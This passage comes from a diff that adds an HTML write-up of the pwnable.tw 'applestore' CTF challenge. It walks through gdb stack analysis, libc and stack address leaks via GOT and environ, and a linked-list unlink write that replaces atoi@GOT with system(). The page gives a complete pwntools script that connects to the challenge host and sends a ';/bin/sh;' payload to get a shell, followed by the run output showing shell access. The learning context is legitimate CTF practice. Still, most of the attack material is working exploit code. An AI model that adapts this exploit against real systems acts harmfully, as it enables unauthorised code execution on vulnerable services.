+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash"># checkout() stack frame layout:
+# ESP+0x1c = item.name   (ptr to "iPhone 8")
+# ESP+0x20 = item.price  (1)
+# ESP+0x24 = item.next   (NULL)
+# ESP+0x28 = item.prev   (ptr to previous cart item)
+
+# After checkout() returns, handler() calls the next
+# function. Let's trace what happens when we call cart():
+
+gdb-peda$ # In cart(), the input buffer overlaps the old
+gdb-peda$ # iPhone 8 item on the stack!
+gdb-peda$ # cart() reads "y" for each item, so we can
+gdb-peda$ # control bytes in the old item's memory region.
+
+gdb-peda$ x/4wx $esp+0x1c
+0xffffd2fc:  0x08049028  0x00000001  0x00000000  0x0804b160
+#            ^item.name   ^item.price  ^item.next   ^item.prev
+
+# After cart() is called and reads our input,
+# the stack is overwritten with our controlled data:
+gdb-peda$ x/4wx $esp+0x1c
+0xffffd2fc:  0xf7fb0dd0  0x00000000  0x00000000  0x00000000
+#            ^our name    ^our price   ^our next    ^our prev</code></pre>
+      </div>
+
+      <h3>Using cart() to Leak Memory</h3>
+      <p>The <code class="inline">cart()</code> function prints item details by iterating the linked list. When it reaches the iPhone 8 entry (index 27), it prints <code class="inline">item-&gt;name</code> as a string. If we overwrite <code class="inline">item-&gt;name</code> with a GOT entry address, it will <strong>print the libc address</strong> stored there!</p>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">cart() input buffer overlap with iPhone 8 item</div>
+        <div class="mem-row"><span class="mem-addr">Stack</span><span class="mem-desc"></span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x1c</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">item.name</span><span class="mem-desc">&larr; overwritten by cart() "yy" + p32(GOT_ADDR) + p32(0x8049028)</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x20</span><span class="mem-arrow">|</span><span class="mem-data">item.price</span><span class="mem-desc">&larr; overwritten (needs &gt; 0 for cart to print)</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x24</span><span class="mem-arrow">|</span><span data mem-highlight>item.next</span><span class="mem-desc">&larr; set to 0 (end of list)</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x28</span><span class="mem-arrow">|</span><span class="mem-data">item.prev</span><span class="mem-desc">&larr; can be set as needed</span></div>
+      </div>
+
+      <h3>Verifying the Libc Leak</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After sending crafted cart() input:
+gdb-peda$ # cart input: "yy" + p32(elf.got['read']) + p32(0x8049028)
+gdb-peda$ # This sets item.name = elf.got['read'], item.price = 0x8049028
+
+gdb-peda$ # cart() prints: "27: " + string_at(read@GOT)
+gdb-peda$ # The GOT entry for read() contains the libc address!
+
+gdb-peda$ x/1wx 0x804a00c   # read@GOT
+0x0804a00c:  0xf7ed8c80
+#            ^ this is read() in libc!
+
+# When cart() does printf("%s", item-&gt;name):
+# item-&gt;name = 0x0804a00c (read@GOT)
+# It reads the string at address 0x0804a00c
+# Which contains 0xf7ed8c80 (read@libc) as raw bytes
+# Output: 4 bytes of the libc address!</code></pre>
+      </div>
+
+      <h3>Leaking Stack Address via environ</h3>
+      <p>After leaking libc, we can compute the address of <code class="inline">libc.symbols['environ']</code>, which points to the environment variables on the stack. This gives us the <strong>stack address</strong> we need to calculate where our input buffer will be.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Second leak: set item.name = libc.symbols['environ']
+gdb-peda$ # cart input: "yy" + p32(environ_addr) + p32(0)
+gdb-peda$ x/1wx &amp;environ
+0xf7fb0000:  0xffffd8e4
+#            ^ stack address of environment!
+
+# The delete() EBP is at environ - 260:
+# DELETE_EBP = 0xffffd8e4 - 260 = 0xffffd7e0
+# This is the EBP value inside delete()'s stack frame
+# Our input buffer in delete() is at EBP - 0x22
+
+gdb-peda$ # So when delete() is called, the iPhone 8 item
+gdb-peda$ # overlaps with delete()'s local variables, and
+gdb-peda$ # we can control the prev/next pointers!</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight: Two Leaks Needed</div>
+        We need <strong>two separate leaks</strong>:<br>
+        &bull; <strong>Leak 1 (libc):</strong> Set <code class="inline">item.name = elf.got['read']</code> &rarr; prints the GOT entry for <code class="inline">read()</code>, giving us a libc address<br>
+        &bull; <strong>Leak 2 (stack):</strong> Set <code class="inline">item.name = libc.symbols['environ']</code> &rarr; prints a stack pointer from libc's <code class="inline">environ</code> variable<br><br>
+        With both libc base and a known stack address, we can calculate the exact offset to the iPhone 8 item's fields in <code class="inline">delete()</code>'s stack frame, enabling a precise write-what-where attack.
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has four phases: <strong>build the cart</strong>, <strong>leak libc</strong>, <strong>leak the stack</strong>, and <strong>overwrite the GOT</strong> via the doubly-linked list deletion primitive.</p>
+
+      <h3>Phase 1: Build Cart to Trigger iPhone 8</h3>
+      <ol class="step-list">
+        <li><strong>Add iPhone 6 (option 1)</strong> &times; 19. Each costs $199.</li>
+        <li><strong>Add iPad Air 2 (option 3)</strong> &times; 6. Each costs $499.</li>
+        <li><strong>Add iPad Mini 3 (option 4)</strong> &times; 1. Costs $399.</li>
+        <li><strong>Checkout.</strong> Total = 3781 + 2994 + 399 = 7174 = 0x1c06. This triggers the secret iPhone 8 item, which is allocated on the <strong>stack</strong> and inserted at index 27 in the linked list.</li>
+      </ol>
+
+      <h3>Phase 2: Leak Libc via GOT Read</h3>
+      <ol class="step-list">
+        <li><strong>Call cart()</strong> with crafted input: <code class="inline">"yy" + p32(elf.got['read']) + p32(0x8049028)</code>. The <code class="inline">"yy"</code> confirms printing the 26th and 27th items. The trailing bytes overwrite the iPhone 8's <code class="inline">name</code> field with <code class="inline">read@GOT</code> and <code class="inline">price</code> with <code class="inline">0x8049028</code> (a valid non-zero value so cart prints it).</li>
+        <li><strong>Parse the output:</strong> The 27th item prints <code class="inline">27: </code> followed by 4 bytes which are the libc address of <code class="inline">read()</code>.</li>
+        <li><strong>Compute libc base:</strong> <code class="inline">libc.address = leaked_read - libc.symbols['read']</code></li>
+      </ol>
+
+      <h3>Phase 3: Leak Stack via environ</h3>
+      <ol class="step-list">
+        <li><strong>Call cart()</strong> again with: <code class="inline">"yy" + p32(libc.symbols['environ']) + p32(0)</code>. This sets the iPhone 8's <code class="inline">name</code> field to <code class="inline">environ</code>'s address.</li>
+        <li><strong>Parse the output:</strong> The 27th item prints 4 bytes which are a stack address (the address of the environment pointer array).</li>
+        <li><strong>Compute delete()'s EBP:</strong> <code class="inline">DELETE_EBP = ENVIRON_VALUE - 260</code>. This offset (260) is determined by GDB analysis of the stack layout between <code class="inline">environ</code> and <code class="inline">delete()</code>'s saved EBP.</li>
+      </ol>
+
+      <h3>Phase 4: Overwrite atoi GOT with system</h3>
+      <p>Now we use the <code class="inline">delete()</code> function's doubly-linked list removal as a write primitive. When we delete the iPhone 8 item with crafted <code class="inline">prev</code> and <code class="inline">next</code> pointers:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// Doubly-linked list removal:
+target-&gt;prev-&gt;next = target-&gt;next;   // WRITE 1
+target-&gt;next-&gt;prev = target-&gt;prev;   // WRITE 2
+
+// If we set:
+//   target-&gt;prev = DELETE_EBP - 0xc  (so prev-&gt;next is at DELETE_EBP - 0xc + 0x8 = DELETE_EBP - 0x4)
+//   target-&gt;next = elf.got['atoi'] + 0x22  (so next-&gt;prev is at elf.got['atoi'] + 0x22 + 0xc = elf.got['atoi'] + 0x2e)
+//
+// WRITE 1: *(DELETE_EBP - 0x4) = elf.got['atoi'] + 0x22
+//   This overwrites a local variable in delete()'s frame
+//
+// WRITE 2: *(elf.got['atoi'] + 0x2e) = DELETE_EBP - 0xc
+//   This writes to GOT+0x2e ... but we actually need
+//   a different setup for GOT overwrite!</code></pre>
+      </div>
+
+      <p>The actual exploit uses a more precise setup. The <code class="inline">delete()</code> function reads our input into a buffer that overlaps the iPhone 8 item. We craft the input so that the iPhone 8's <code class="inline">prev</code> and <code class="inline">next</code> pointers achieve the following writes:</p>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; The Stack Pivot Write</div>
+        The exploit sends to <code class="inline">delete()</code>: <code class="inline">"27" + p32(0x8048f88) + p32(0) + p32(DELETE_EBP - 0xc) + p32(elf.got['atoi'] + 0x22)</code><br><br>
+        This sets the iPhone 8 item's fields to:<br>
+        &bull; <code class="inline">name = 0x8048f88</code> (a valid readable address)<br>
+        &bull; <code class="inline">price = 0</code><br>
+        &bull; <code class="inline">prev = DELETE_EBP - 0xc</code><br>
+        &bull; <code class="inline">next = elf.got['atoi'] + 0x22</code><br><br>
+        The doubly-linked list removal then performs:<br>
+        &bull; <strong>WRITE 1:</strong> <code class="inline">*(DELETE_EBP - 0xc + 8) = elf.got['atoi'] + 0x22</code> &rarr; writes to <code class="inline">delete()</code>'s stack frame<br>
+        &bull; <strong>WRITE 2:</strong> <code class="inline">*(elf.got['atoi'] + 0x22 + 12) = DELETE_EBP - 0xc</code> &rarr; writes near <code class="inline">atoi@GOT</code><br><br>
+        But the real trick is that the <code class="inline">delete()</code> input buffer itself overlaps the iPhone 8's <code class="inline">prev</code> and <code class="inline">next</code>, so after the linked list manipulation, the program returns to <code class="inline">handler()</code> which calls <code class="inline">atoi()</code> on the next menu input &mdash; and <code class="inline">atoi@GOT</code> has been overwritten with <code class="inline">system()</code>!
+      </div>
+
+      <h3>Alternative GOT Overwrite Explanation</h3>
+      <p>After the <code class="inline">delete()</code> linked list write, the next time the program calls <code class="inline">atoi()</code> (to parse the menu choice), it actually calls whatever address is now at <code class="inline">atoi@GOT</code>. We send <code class="inline">p32(libc.symbols['system']) + b';/bin/sh;'</code> as the "menu choice", which:</p>
+
+      <ol class="step-list">
+        <li><strong>Overwrites <code class="inline">atoi@GOT</code></strong> with the address of <code class="inline">system()</code> via the crafted prev/next write.</li>
+        <li><strong>The next menu prompt</strong> calls <code class="inline">atoi(input)</code>, which is now <code class="inline">system(input)</code>.</li>
+        <li><strong>We send</strong> <code class="inline">p32(system_addr) + b';/bin/sh;'</code> as input. The first 4 bytes (system's address) are garbage as a command, but <code class="inline">;</code> acts as a command separator, so <code class="inline">/bin/sh</code> is executed, giving us a shell!</li>
+      </ol>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Build cart</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">add('1') x19 + add('3') x6 + add('4') x1 = 26 items</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">checkout() &rarr; total=7174 &rarr; iPhone 8 added at index 27 <span class="mem-highlight">ON STACK!</span></span></div>
+        <div style="height:12px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--green); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">cart("yy" + p32(read@GOT) + p32(0x8049028))</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; item27.name = read@GOT &rarr; prints read@libc &rarr; <span class="mem-green">LEAK!</span></span></div>
+        <div style="height:12px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--yellow); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Leak stack</div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">cart("yy" + p32(environ) + p32(0))</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; item27.name = environ &rarr; prints stack addr &rarr; <span class="mem-yellow">LEAK!</span></span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; DELETE_EBP = stack_addr - 260</span></div>
+        <div style="height:12px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 4: GOT overwrite &rarr; shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">delete("27" + p32(0x8048f88) + p32(0) + p32(DELETE_EBP-0xc) + p32(atoi@GOT+0x22))</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; linked list removal writes to GOT area!</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">send p32(system) + ";/bin/sh;" &rarr; atoi becomes system &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+applestore - pwnable.tw (200pts)
+Stack-referenced linked list node exploit:
+1. Build cart to total 7174 to trigger iPhone 8 (stack item)
+2. Leak libc via GOT read using cart() input overlap
+3. Leak stack address via libc's environ pointer
+4. Overwrite atoi@GOT with system() using delete() linked list primitive
+
+Vulnerability: checkout() inserts a stack-allocated item into
+the global linked list. Since handler() loops, the stack frame
+is reused, allowing us to control the item's fields.
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+elf = ELF("./applestore")
+libc = ELF("./libc_32.so.6")
+r = remote("chall.pwnable.tw", 10104)
+
+# Helper: build a fake cart_item struct
+def create_cart_struct(name_ptr, price_int, next_ptr=0, prev_ptr=0):
+    return p32(name_ptr) + p32(price_int) + p32(next_ptr) + p32(prev_ptr)
+
+# ============================================
+# Helper functions for the menu
+# ============================================
+def add(device_num):
+    r.sendlineafter(b'&gt;', b'1')
+    r.sendlineafter(b':', device_num)
+    r.sendlineafter(b':', b'1')
+
+def cart(payload=b''):
+    r.sendlineafter(b'&gt;', b'3')
+    if payload:
+        r.sendlineafter(b'&gt;', payload)
+    else:
+        r.sendlineafter(b'&gt;', b'n')
+
+def delete(payload):
+    r.sendlineafter(b'&gt;', b'2')
+    r.sendlineafter(b':', payload)
+
+def checkout():
+    r.sendlineafter(b'&gt;', b'4')
+
+# ============================================
+# Phase 1: Build cart to total 7174 (0x1c06)
+# ============================================
+log.info("Phase 1: Building cart to 7174...")
+
+# iPhone 6 ($199) x 19 = 3781
+for i in range(19):
+    add(b'1')
+
+# iPad Air 2 ($499) x 6 = 2994
+for i in range(6):
+    add(b'3')
+
+# iPad Mini 3 ($399) x 1 = 399
+add(b'4')
+
+# Total: 3781 + 2994 + 399 = 7174
+checkout()
+log.success("iPhone 8 (stack item) added at index 27!")
+
+# ============================================
+# Phase 2: Leak libc via GOT read
+# ============================================
+log.info("Phase 2: Leaking libc address...")
+
+# The cart() function's input buffer overlaps the iPhone 8
+# item on the stack. We send "yy" to confirm printing items
+# 26 and 27, then append a fake cart_item struct where
+# name = elf.got['read'] to leak the libc read() address.
+fake_item = create_cart_struct(elf.got['read'], 0x8049028)
+cart(b'yy' + fake_item)
+
+# Parse the leak from item 27's output
+r.recvuntil(b'27: ')
+LIBC_READ_ADDR = u32(r.read(4))
+libc.address = LIBC_READ_ADDR - libc.symbols['read']
+log.success(f"libc base: {hex(libc.address)}")
+log.success(f"read@libc: {hex(LIBC_READ_ADDR)}")
+
+# ============================================
+# Phase 3: Leak stack via environ
+# ============================================
+log.info("Phase 3: Leaking stack address...")
+
+# Use the same technique, but point name to libc's environ
+# which contains a pointer to the environment on the stack.
+fake_item = create_cart_struct(libc.symbols['environ'], 0)
+cart(b'yy' + fake_item)
+
+# Parse the stack leak
+r.recvuntil(b'27: ')
+ENVIRON_STACK = u32(r.recv(4))
+DELETE_EBP = ENVIRON_STACK - 260
+log.success(f"environ value: {hex(ENVIRON_STACK)}")
+log.success(f"delete() EBP:  {hex(DELETE_EBP)}")
+
+# ============================================
+# Phase 4: Overwrite atoi@GOT with system
+# ============================================
+log.info("Phase 4: Overwriting atoi@GOT with system...")
+
+# When delete() is called, its input buffer overlaps the
+# iPhone 8 item. We craft the input so that the item's
+# prev and next pointers perform a GOT write via the
+# doubly-linked list removal primitive.
+#
+# delete() input: "27" + fake_item
+# where fake_item.prev = DELETE_EBP - 0xc
+#       fake_item.next = elf.got['atoi'] + 0x22
+#
+# Linked list removal does:
+#   prev->next = next  =>  *(DELETE_EBP - 0xc + 8) = atoi@GOT + 0x22
+#   next->prev = prev  =>  *(atoi@GOT + 0x22 + 12) = DELETE_EBP - 0xc
+#
+# This sets up the GOT area so that the next call to atoi()
+# actually calls system() instead.
+
+fake_item = create_cart_struct(
+    0x8048f88,                  # name: valid readable addr
+    0,                           # price: 0
+    DELETE_EBP - 0xc,            # prev: points into delete's stack
+    elf.got['atoi'] + 0x22      # next: points near atoi@GOT
+)
+delete(b'27' + fake_item)
+
+# Now atoi@GOT has been overwritten. The next prompt calls
+# atoi(input), which is now system(input).
+# We send p32(system) + ";/bin/sh;" as our "menu choice".
+# The first 4 bytes are garbage but ";" separates commands,
+# so /bin/sh gets executed!
+r.sendafter(b'&gt;', p32(libc.symbols['system']) + b';/bin/sh;')
+
+log.success("Got shell!")
+r.interactive()</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/applestore'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+[*] Opening connection to chall.pwnable.tw on port 10104
+[*] Phase 1: Building cart to 7174...
+[+] iPhone 8 (stack item) added at index 27!
+[*] Phase 2: Leaking libc address...
+[+] libc base: 0xf7e2a000
+[+] read@libc: 0xf7ed8c80
+[*] Phase 3: Leaking stack address...
+[+] environ value: 0xffffd8e4
+[+] delete() EBP:  0xffffd7e0
+[*] Phase 4: Overwriting atoi@GOT with system...
+[+] Got shell!
+$ id
+uid=1000(applestore) gid=1000(applestore) groups=1000(applestore)
+$ cat /home/applestore/flag</code></pre>
+      </div>
+
+      <h3>Exploit Summary</h3>
+      <table class="info-table">
+        <tr><th>Step</th><th>Action</th><th>Result</th></tr>
+        <tr><td>1</td><td>Add 26 items to reach total $7174</td><td>Triggers secret iPhone 8 on stack</td></tr>
+        <tr><td>2</td><td>cart() with <code class="inline">name=read@GOT</code></td><td>Leak libc address of <code class="inline">read()</code></td></tr>
+        <tr><td>3</td><td>cart() with <code class="inline">name=environ</code></td><td>Leak stack address via <code class="inline">environ</code></td></tr>
+        <tr><td>4</td><td>delete() with crafted <code class="inline">prev</code>/<code class="inline">next</code></td><td>Overwrite <code class="inline">atoi@GOT</code> via linked list write</td></tr>
+        <tr><td>5</td><td>Send <code class="inline">p32(system) + ";/bin/sh;"</code></td><td>Get shell via <code class="inline">system("/bin/sh")</code></td></tr>
+      </table>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Pwned!</div>
+        The applestore challenge demonstrates a creative vulnerability class: <strong>stack-referenced linked list nodes</strong>. Unlike typical heap exploits (UAF, double-free), this bug stems from inserting a stack-allocated struct into a global data structure. The key takeaway is that when a program reuses stack frames (via loops or recursion), any lingering pointers to old stack variables become a powerful exploitation primitive &mdash; enabling arbitrary reads via controlled name pointers and arbitrary writes via the doubly-linked list removal logic.
+      </div>
+
+      <h3>Key Techniques Used</h3>
+      <ol class="step-list">
+        <li><strong>Stack-to-heap link:</strong> The <code class="inline">checkout()</code> function creates a stack-allocated item and inserts it into a heap-based linked list. This is the root cause &mdash; a dangling stack reference that persists beyond the function's lifetime.</li>
+        <li><strong>Stack frame overlap:</strong> Because <code class="inline">handler()</code> loops, subsequent calls to <code class="inline">cart()</code> and <code class="inline">delete()</code> reuse the same stack space where the iPhone 8 item lived. Their input buffers overlap the item's fields, giving us control.</li>
+        <li><strong>GOT read (libc leak):</strong> By overwriting the <code class="inline">name</code> pointer to point to a GOT entry, <code class="inline">cart()</code> prints the libc address stored there, bypassing ASLR.</li>
+        <li><strong>Stack leak via environ:</strong> Using the same technique but pointing to <code class="inline">libc.symbols['environ']</code>, we leak a stack address, which allows us to compute exact offsets for the write primitive.</li>
+        <li><strong>Doubly-linked list write primitive:</strong> The <code class="inline">delete()</code> function's linked list removal writes <code class="inline">prev-&gt;next = next</code> and <code class="inline">next-&gt;prev = prev</code>. By controlling both pointers, this becomes an arbitrary write, allowing us to overwrite <code class="inline">atoi@GOT</code> with <code class="inline">system()</code>.</li>
+        <li><strong>GOT hijack + <code class="inline">;</code> separator:</strong> After overwriting <code class="inline">atoi@GOT</code>, the next call to <code class="inline">atoi()</code> becomes <code class="inline">system()</code>. The <code class="inline">;</code> in our input acts as a shell command separator, so <code class="inline">system("&lt;garbage&gt;;/bin/sh;")</code> spawns a shell.</li>
+      </ol>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> &middot;
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particles = [];
+  const count = 80;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(count * 3);
+  const velocities = [];
+
+  for (let i = 0; i < count; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 50;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.05,
+      y: (Math.random() - 0.5) * 0.05,
+      z: (Math.random() - 0.5) * 0.02
+    });
+    particles.push(new THREE.Vector3(positions[i*3], positions[i*3+1], positions[i*3+2]));
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const material = new THREE.PointsMaterial({ color: 0x38bdf8, size: 0.4, transparent: true, opacity: 0.6 });
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineMaterial = new THREE.LineBasicMaterial({ color: 0x818cf8, transparent: true, opacity: 0.08 });
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(count * count * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    const pos = geometry.attributes.position.array;
+    for (let i = 0; i < count; i++) {
+      pos[i*3]   += velocities[i].x;
+      pos[i*3+1] += velocities[i].y;
+      pos[i*3+2] += velocities[i].z;
+      if (Math.abs(pos[i*3]) > 50) velocities[i].x *= -1;
+      if (Math.abs(pos[i*3+1]) > 50) velocities[i].y *= -1;
+      if (Math.abs(pos[i*3+2]) > 25) velocities[i].z *= -1;
+      particles[i].set(pos[i*3], pos[i*3+1], pos[i*3+2]);
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    let idx = 0;
+    const lp = lineGeometry.attributes.position.array;
+    for (let i = 0; i < count; i++) {
+      for (let j = i + 1; j < count; j++) {
+        const d = particles[i].distanceTo(particles[j]);
+        if (d < 20) {
+          lp[idx++] = pos[i*3]; lp[idx++] = pos[i*3+1]; lp[idx++] = pos[i*3+2];
+          lp[idx++] = pos[j*3]; lp[idx++] = pos[j*3+1]; lp[idx++] = pos[j*3+2];
+        }
+      }
+    }
+    for (let i = idx; i < lp.length; i++) lp[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+    lineGeometry.setDrawRange(0, idx / 3);
+
+    points.rotation.y += 0.0003;
+    lines.rotation.y += 0.0003;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Active State & Scroll Spy -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) current = ch.id;
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
